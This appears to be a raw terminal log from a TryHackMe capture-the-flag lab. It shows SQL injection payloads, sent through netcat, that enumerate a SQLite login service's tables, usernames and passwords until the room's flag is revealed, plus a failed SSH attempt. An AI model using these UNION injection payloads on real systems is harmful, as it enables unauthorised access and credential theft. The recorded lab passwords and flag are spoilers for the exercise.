
```
nc 10.10.67.207 1337 <<< "smokey' Union Select name From sqlite_master WHERE type='table"
Welcome to the Light database!
Please enter your username: Password: admintable
Please enter your username: ^C


nc 10.10.67.207 1337 <<< "smokey' Union Select username From admintable WHERE username LIKE '%"
Welcome to the Light database!
Please enter your username: Password: TryHackMeAdmin
Please enter your username: 


nc 10.10.67.207 1337 <<< "smokey' Union Select password From admintable WHERE username='TryHackmeAdmin"
Welcome to the Light database!
Please enter your username: Password: vYQ5ngPpw8AdUmL
Please enter your username: ^C


nc 10.10.67.207 1337 <<< "smokey' Union Select password From admintable WHERE username='TryHackMeAdmin"
Welcome to the Light database!
Please enter your username: Password: mamZtAuMlrsEy5bp6q17
Please enter your username: 


fail

root@ip-10-10-2-8:~# ssh TryHackmeAdmin@10.10.67.207
TryHackmeAdmin@10.10.67.207's password: 
Permission denied, please try again.
TryHackmeAdmin@10.10.67.207's password: 


nc 10.10.67.207 1337 <<< "smokey' Union Select password From admintable WHERE username!='TryHackmeAdmin"
Welcome to the Light database!
Please enter your username: Password: THM{SQLit3_InJ3cTion_is_SimplE_nO?}
Please enter your username: 



```